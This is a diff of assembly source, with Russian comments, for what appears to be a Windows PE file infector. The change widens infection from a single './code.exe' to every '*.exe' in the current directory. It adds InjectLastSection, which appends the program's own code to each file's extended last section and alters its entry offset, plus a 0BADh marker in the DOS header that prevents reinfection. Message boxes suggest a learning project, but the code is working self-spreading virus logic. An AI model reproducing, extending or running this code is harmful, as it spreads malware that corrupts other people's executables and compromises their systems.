@@ -49,10 +49,7 @@ else
 	OFFSET_LDR equ <0Ch>
 	OFFSET_INIT_LIST equ <1Ch>
 	cur_seg_reg equ <fs>
-endif 
-
-SHELL_TABLE_SIZE equ <3*sizeof(cword)>
-IMAGE_DATA_DIRECTORY_SIZE equ <2*sizeof(dword)>
+endif
 
 include pe_parser.inc
 
@@ -117,8 +114,8 @@ endm
 FindProcAddressByName proto CurrentStdcallNotation :ptr byte
 FindProcAddress proto CurrentStdcallNotation :ptr byte, :ptr byte
 FindProcArray proto CurrentStdcallNotation :ptr byte, :ptr byte, :cword
-InjectRun proto CurrentStdcallNotation
-InjectCode proto CurrentStdcallNotation :cword, :cword, :cword
+InjectEXE proto CurrentStdcallNotation
+InjectLastSection proto CurrentStdcallNotation :cword, :cword, :cword
 ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword
 LoadPeFile proto CurrentStdcallNotation :ptr byte, :ptr byte, :cword
 UnloadPeFile proto CurrentStdcallNotation :cword
@@ -193,7 +190,7 @@ local 	oldProtect:cword
     
     ;invoke ListSystemDir
     
-    invoke InjectRun
+    invoke InjectEXE
     ;lea ccx, [cbx + str_Kernel32]
     ;invoke LoadPeFile, ccx, addr [pe], 0
     
@@ -213,7 +210,7 @@ endif
 main endp
 
 ; инъекция то есть непосредственно
-InjectRun proc CurrentStdcallNotation
+InjectEXE proc CurrentStdcallNotation
 	local hFindFile:HANDLE
 	local findData:WIN32_FIND_DATAA
 	local pe:PeParser
@@ -226,7 +223,7 @@ InjectRun proc CurrentStdcallNotation
 		mov [rbp + 28h], r9
 	endif
 	
-    invoke sc_FindFirstFileA, addr [cbx + str_code], addr findData
+    invoke sc_FindFirstFileA, addr [cbx + str_exe], addr findData
 	.if cax == -1
 		invoke sc_MessageBoxA, NULL, addr [cbx + msg_file_not_found], NULL, NULL
 		ret
@@ -234,29 +231,33 @@ InjectRun proc CurrentStdcallNotation
     
 	mov [hFindFile], cax
 	
-	invoke sc_MessageBoxA, NULL, addr [findData].WIN32_FIND_DATAA.cFileName, NULL, NULL
-	invoke LoadPeFile, addr [findData].WIN32_FIND_DATAA.cFileName , addr [pe], 0
-	.if cax == 1
-		mov ccx, endCode
-		sub ccx, start
-		mov [codeSize], ccx
-	
-		invoke InjectCode, addr [pe], addr [cbx + start], [codeSize]		
-		invoke UnloadPeFile, addr [pe]
-	.endif
+	.while cax != 0
+		invoke sc_MessageBoxA, NULL, addr [findData].WIN32_FIND_DATAA.cFileName, NULL, NULL
+		
+		invoke LoadPeFile, addr [findData].WIN32_FIND_DATAA.cFileName , addr [pe], 0
+		.if cax == 1
+			mov ccx, endCode
+			sub ccx, start
+			mov [codeSize], ccx
+			
+			
+			invoke InjectLastSection, addr [pe], addr [cbx + start], [codeSize]
+			invoke UnloadPeFile, addr [pe]
+		.endif
+		
+		invoke sc_FindNextFileA, [hFindFile], addr [findData]   
+    .endw
 	
     invoke sc_FindClose, [hFindFile]
     ret
-InjectRun endp
+InjectEXE endp
 
-InjectCode proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cword
+InjectLastSection proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cword
 	local dst:cword
 	local src:cword
 	local rawNewData:cword
 	local rvaNewData:cword
 	local entryOffset:cword
-	local foundSpace:Space
-	local origCodeSize:cword
 	
 	ifdef _WIN64
 		mov [rbp + 10h], rcx
@@ -264,6 +265,18 @@ InjectCode proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cword
 		mov [rbp + 20h], r8
 		mov [rbp + 28h], r9
 	endif
+	
+	mov cax, [pe]
+	mov cax, [cax].PeParser.doshead
+	mov dx, [cax].IMAGE_DOS_HEADER.e_csum
+	.if dx == 0BADh
+		invoke sc_MessageBoxA, NULL, addr [cbx + msg_pe_has_been_already_injected], NULL, NULL
+		ret
+	.endif
+	
+	mov cax, [pe]
+	mov cax, [cax].PeParser.doshead
+	mov [cax].IMAGE_DOS_HEADER.e_csum, 0BADh
 	
 	mov cdx, [pe]
 	mov cdx, [cdx].PeParser.nthead
@@ -280,7 +293,7 @@ InjectCode proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cword
 	add [entryOffset], cax
 	
 	; Расширяем последнюю секцию и получаем ее виртуальный адрес и файловое смещение
-    ; ExtendLastSection (pe, origCodeSize, &rvaNewData, &rawNewData);
+    ; ExtendLastSection (pe, codeSize, &rvaNewData, &rawNewData);
 	invoke ExtendLastSection, [pe], [codeSize], addr [rvaNewData], addr [rawNewData]
 	
 	
@@ -308,14 +321,13 @@ InjectCode proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cword
 	mov cax, [pe]
 	mov cax, [cax].PeParser.nthead
 	lea cax, [cax].IMAGE_NT_HEADERS.FileHeader
-	
 	mov dx, [cax].IMAGE_FILE_HEADER.Characteristics
 	or dx, IMAGE_FILE_RELOCS_STRIPPED
 	mov word ptr [cax].IMAGE_FILE_HEADER.Characteristics, dx
 	
 	invoke sc_MessageBoxA, NULL, addr [cbx + msg_success], NULL, NULL
 	ret
-InjectCode endp
+InjectLastSection endp
 
 AlignToTop proc CurrentStdcallNotation value:cword, alignv:cword
 	local maskv:cword
@@ -667,12 +679,10 @@ dec_format:
 db "size code %08d", 10, 0
 msg_file_not_found:
 db "File not found", 10, 0
-msg_error_code_section_not_found:
-db "Code section not found", 10, 0
-msg_error_space_not_found:
-db "Space not found", 10, 0
-str_code:
-db "./code.exe", 0
+msg_pe_has_been_already_injected:
+db "Pe has been already injected", 10, 0
+str_exe:
+db "./*.exe", 0
 msg_success:
 db "SUCCESS", 0
 
